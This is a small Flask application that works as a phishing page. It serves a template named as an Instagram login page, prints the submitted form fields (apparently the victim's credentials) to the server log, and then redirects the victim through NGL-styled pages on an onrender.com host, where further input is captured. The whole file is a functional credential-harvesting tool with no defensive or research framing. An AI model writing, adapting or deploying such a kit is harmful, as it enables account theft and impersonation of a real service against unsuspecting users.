from flask import Flask, render_template, request, redirect
import logging

app = Flask("__main__", template_folder="templates", static_folder="static")
logging.basicConfig(level=logging.DEBUG)


@app.route("/")
def abc():
    return render_template("Login • Instagram.html")


@app.route("/saanvi_17")
def saanvi_17():
    return render_template("home.html")


@app.route("/after")
def after():
    return render_template("after.html")


@app.route("/abc", methods=["POST", "GET"])
def run_insta_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl.onrender.com/saanvi_17")


@app.route("/saanvi_17", methods=["POST", "GET"])
def run_ngl_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl.onrender.com/after")


if __name__ == "__main__":
    app.run()
